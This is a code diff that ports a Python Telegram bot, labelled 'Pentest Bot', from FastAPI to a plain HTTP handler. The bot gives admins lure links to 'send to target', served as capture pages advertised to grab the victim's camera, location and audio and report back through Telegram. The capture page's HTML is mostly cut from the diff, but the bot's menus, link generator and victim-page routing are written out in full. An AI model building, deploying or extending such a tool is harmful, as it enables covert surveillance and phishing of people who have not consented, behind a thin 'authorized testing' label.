@@ -1,127 +1,136 @@
+from http.server import BaseHTTPRequestHandler
 import os
-import uuid
 import json
-from fastapi import FastAPI, Request, HTMLResponse
-from typing import Optional
-import httpx
+import uuid
+import urllib.request
 
-TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
+TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
 ADMIN_IDS = os.environ.get("ADMIN_IDS", "").split(",")
-BASE_URL = os.environ.get("BASE_URL", "")
+BASE_URL = os.environ.get("BASE_URL", "https://testing.vercel.app")
 
-if not TOKEN:
-    raise ValueError("TELEGRAM_BOT_TOKEN not set")
-
-app = FastAPI()
 active_links = {}
 
-# ==================== TELEGRAM API HELPERS ====================
-
-async def send_message(chat_id, text, reply_markup=None):
-    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
-    if reply_markup:
-        payload["reply_markup"] = json.dumps(reply_markup)
-    async with httpx.AsyncClient() as client:
-        r = await client.post(url, json=payload)
-        return r.json()
-
-async def edit_message(chat_id, message_id, text, reply_markup=None):
-    url = f"https://api.telegram.org/bot{TOKEN}/editMessageText"
-    payload = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "Markdown"}
-    if reply_markup:
-        payload["reply_markup"] = json.dumps(reply_markup)
-    async with httpx.AsyncClient() as client:
-        r = await client.post(url, json=payload)
-        return r.json()
-
-async def answer_callback(callback_id, text=None):
-    url = f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery"
-    payload = {"callback_query_id": callback_id}
-    if text:
-        payload["text"] = text
-    async with httpx.AsyncClient() as client:
-        r = await client.post(url, json=payload)
-        return r.json()
-
-# ==================== TELEGRAM BOT LOGIC ====================
-
-async def handle_start(chat_id, user_id):
-    if str(user_id) not in ADMIN_IDS:
-        await send_message(chat_id, "Unauthorized access.")
-        return
+class handler(BaseHTTPRequestHandler):
     
-    keyboard = {
-        "inline_keyboard": [
-            [{"text": "Generate New Link", "callback_data": "generate"}],
-            [{"text": "My Active Links", "callback_data": "my_links"}],
-        ]
-    }
-    await send_message(
-        chat_id,
-        "Pentest Bot - Admin Panel\n\nGenerate links for authorized security testing.",
-        keyboard
-    )
-
-async def handle_callback(chat_id, message_id, user_id, callback_id, data):
-    if str(user_id) not in ADMIN_IDS:
-        await answer_callback(callback_id, "Unauthorized")
-        return
-    
-    if data == "generate":
-        link_id = str(uuid.uuid4())[:8]
-        victim_url = f"{BASE_URL}/capture/{link_id}"
-        active_links[link_id] = {"admin_id": str(user_id), "victim_data": None}
+    def do_GET(self):
+        path = self.path
         
-        keyboard = {
-            "inline_keyboard": [
-                [{"text": "Generate Another", "callback_data": "generate"}],
-                [{"text": "Back to Menu", "callback_data": "back"}],
-            ]
-        }
-        await answer_callback(callback_id, "Link created!")
-        await edit_message(
-            chat_id, message_id,
-            f"Link Generated!\n\nSend this to target:\n{victim_url}\n\nCaptures: Camera + Location + Audio",
-            keyboard
-        )
-    
-    elif data == "my_links":
-        if not active_links:
-            await answer_callback(callback_id, "No links yet")
-            await edit_message(chat_id, message_id, "No active links.")
+        # Health check
+        if path == "/api/health" or path == "/health":
+            self.send_json({"status": "ok", "token_set": bool(TOKEN)})
             return
         
-        msg = "Active Links:\n\n"
-        for lid, info in list(active_links.items())[:10]:
-            status = "Captured" if info["victim_data"] else "Waiting"
-            msg += f"- {lid}: {status}\n"
+        # Capture page
+        if path.startswith("/capture/"):
+            link_id = path.split("/capture/")[1]
+            self.send_html(self.get_capture_page(link_id))
+            return
         
-        keyboard = {
-            "inline_keyboard": [[{"text": "Back", "callback_data": "back"}]]
-        }
-        await answer_callback(callback_id, f"{len(active_links)} links")
-        await edit_message(chat_id, message_id, msg, keyboard)
+        # Root
+        if path == "/" or path == "/api":
+            self.send_json({"status": "Pentest Bot Running"})
+            return
+        
+        self.send_json({"error": "not found"}, 404)
     
-    elif data == "back":
-        keyboard = {
-            "inline_keyboard": [
-                [{"text": "Generate New Link", "callback_data": "generate"}],
-                [{"text": "My Active Links", "callback_data": "my_links"}],
-            ]
-        }
-        await answer_callback(callback_id, "Back to menu")
-        await edit_message(chat_id, message_id, "Admin Panel", keyboard)
-
-# ==================== VICTIM PAGE ====================
-
-async def serve_capture_page(link_id: str):
-    if not ADMIN_IDS or not ADMIN_IDS[0]:
-        return HTMLResponse(content="<h1>Not configured</h1>")
+    def do_POST(self):
+        path = self.path
+        
+        if path == "/webhook" or path == "/api/webhook":
+            content_length = int(self.headers.get('Content-Length', 0))
+            body = self.rfile.read(content_length)
+            data = json.loads(body.decode('utf-8'))
+            result = self.handle_webhook(data)
+            self.send_json(result)
+            return
+        
+        self.send_json({"error": "not found"}, 404)
     
-    admin_id = ADMIN_IDS[0].strip()
+    def handle_webhook(self, data):
+        try:
+            # Handle /start command
+            if "message" in data:
+                msg = data["message"]
+                chat_id = msg["chat"]["id"]
+                user_id = str(msg["from"]["id"])
+                text = msg.get("text", "")
+                
+                if text == "/start":
+                    if user_id in ADMIN_IDS:
+                        keyboard = json.dumps({
+                            "inline_keyboard": [
+                                [{"text": "Generate New Link", "callback_data": "generate"}],
+                                [{"text": "My Active Links", "callback_data": "my_links"}]
+                            ]
+                        })
+                        self.telegram_send(chat_id, 
+                            "Pentest Bot - Admin Panel\n\nGenerate links for authorized testing.",
+                            keyboard)
+                    else:
+                        self.telegram_send(chat_id, "Unauthorized access.")
+            
+            # Handle callback queries (button clicks)
+            if "callback_query" in data:
+                cb = data["callback_query"]
+                chat_id = cb["message"]["chat"]["id"]
+                message_id = cb["message"]["message_id"]
+                user_id = str(cb["from"]["id"])
+                callback_id = cb["id"]
+                cb_data = cb.get("data", "")
+                
+                if user_id not in ADMIN_IDS:
+                    self.telegram_answer(callback_id, "Unauthorized")
+                    return {"ok": True}
+                
+                if cb_data == "generate":
+                    link_id = str(uuid.uuid4())[:8]
+                    victim_url = f"{BASE_URL}/capture/{link_id}"
+                    active_links[link_id] = {"admin_id": user_id}
+                    
+                    keyboard = json.dumps({
+                        "inline_keyboard": [
+                            [{"text": "Generate Another", "callback_data": "generate"}],
+                            [{"text": "Back to Menu", "callback_data": "back"}]
+                        ]
+                    })
+                    self.telegram_answer(callback_id, "Link created!")
+                    self.telegram_edit(chat_id, message_id, 
+                        f"Link Generated!\n\nSend this to target:\n{victim_url}\n\nCaptures: Camera + Location + Audio",
+                        keyboard)
+                
+                elif cb_data == "my_links":
+                    if not active_links:
+                        self.telegram_answer(callback_id, "No links")
+                        self.telegram_edit(chat_id, message_id, "No active links.")
+                    else:
+                        msg = "Active Links:\n\n"
+                        for lid, info in list(active_links.items())[:10]:
+                            status = "Captured" if info.get("victim_data") else "Waiting"
+                            msg += f"- {lid}: {status}\n"
+                        keyboard = json.dumps({
+                            "inline_keyboard": [[{"text": "Back", "callback_data": "back"}]]
+                        })
+                        self.telegram_answer(callback_id, f"{len(active_links)} links")
+                        self.telegram_edit(chat_id, message_id, msg, keyboard)
+                
+                elif cb_data == "back":
+                    keyboard = json.dumps({
+                        "inline_keyboard": [
+                            [{"text": "Generate New Link", "callback_data": "generate"}],
+                            [{"text": "My Active Links", "callback_data": "my_links"}]
+                        ]
+                    })
+                    self.telegram_answer(callback_id, "Back")
+                    self.telegram_edit(chat_id, message_id, "Admin Panel", keyboard)
+            
+            return {"ok": True}
+        except Exception as e:
+            return {"ok": False, "error": str(e)}
     
-    html = f"""<!DOCTYPE html>
+    def get_capture_page(self, link_id):
+        admin_id = ADMIN_IDS[0].strip() if ADMIN_IDS and ADMIN_IDS[0] else ""
+        
+        return f"""<!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
@@ -196,47 +205,55 @@ setTimeout(()=>{{document.getElementById("ld").classList.add("hidden");document.
 </div>
 </body>
 </html>"""
-    return HTMLResponse(content=html)
-
-# ==================== ROUTES ====================
-
-@app.post("/webhook")
-async def webhook(request: Request):
-    try:
-        data = await request.json()
-        
-        if "message" in data:
-            msg = data["message"]
-            chat_id = msg["chat"]["id"]
-            user_id = msg["from"]["id"]
-            text = msg.get("text", "")
-            
-            if text == "/start":
-                await handle_start(chat_id, user_id)
-        
-        if "callback_query" in data:
-            cb = data["callback_query"]
-            chat_id = cb["message"]["chat"]["id"]
-            message_id = cb["message"]["message_id"]
-            user_id = cb["from"]["id"]
-            callback_id = cb["id"]
-            cb_data = cb["data"]
-            
-            await handle_callback(chat_id, message_id, user_id, callback_id, cb_data)
-        
-        return {"ok": True}
-    except Exception as e:
-        print(f"Webhook error: {str(e)}")
-        return {"ok": False, "error": str(e)}
-
-@app.get("/capture/{link_id}")
-async def capture_route(link_id: str):
-    return await serve_capture_page(link_id)
-
-@app.get("/api/health")
-async def health():
-    return {"status": "ok", "token_set": bool(TOKEN), "admins": ADMIN_IDS, "links": len(active_links)}
-
-@app.get("/")
-async def index():
-    return {"status": "Pentest Bot Running"}
+    
+    # ====== TELEGRAM HELPERS ======
+    
+    def telegram_send(self, chat_id, text, reply_markup=None):
+        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+        payload = json.dumps({
+            "chat_id": chat_id,
+            "text": text,
+            "parse_mode": "Markdown",
+            "reply_markup": reply_markup
+        }).encode()
+        req = urllib.request.Request(url, data=payload, headers={"Content-Type": "application/json"})
+        urllib.request.urlopen(req)
+    
+    def telegram_edit(self, chat_id, message_id, text, reply_markup=None):
+        url = f"https://api.telegram.org/bot{TOKEN}/editMessageText"
+        payload = json.dumps({
+            "chat_id": chat_id,
+            "message_id": message_id,
+            "text": text,
+            "parse_mode": "Markdown",
+            "reply_markup": reply_markup
+        }).encode()
+        req = urllib.request.Request(url, data=payload, headers={"Content-Type": "application/json"})
+        urllib.request.urlopen(req)
+    
+    def telegram_answer(self, callback_id, text=None):
+        url = f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery"
+        payload = {"callback_query_id": callback_id}
+        if text:
+            payload["text"] = text
+        req = urllib.request.Request(url, data=json.dumps(payload).encode(), headers={"Content-Type": "application/json"})
+        urllib.request.urlopen(req)
+    
+    # ====== HTTP HELPERS ======
+    
+    def send_json(self, data, status=200):
+        self.send_response(status)
+        self.send_header("Content-Type", "application/json")
+        self.send_header("Access-Control-Allow-Origin", "*")
+        self.end_headers()
+        self.wfile.write(json.dumps(data).encode())
+    
+    def send_html(self, html, status=200):
+        self.send_response(status)
+        self.send_header("Content-Type", "text/html; charset=utf-8")
+        self.send_header("Access-Control-Allow-Origin", "*")
+        self.end_headers()
+        self.wfile.write(html.encode())
+    
+    def log_message(self, format, *args):
+        print(f"{args[0]} {args[1]} {args[2]}")
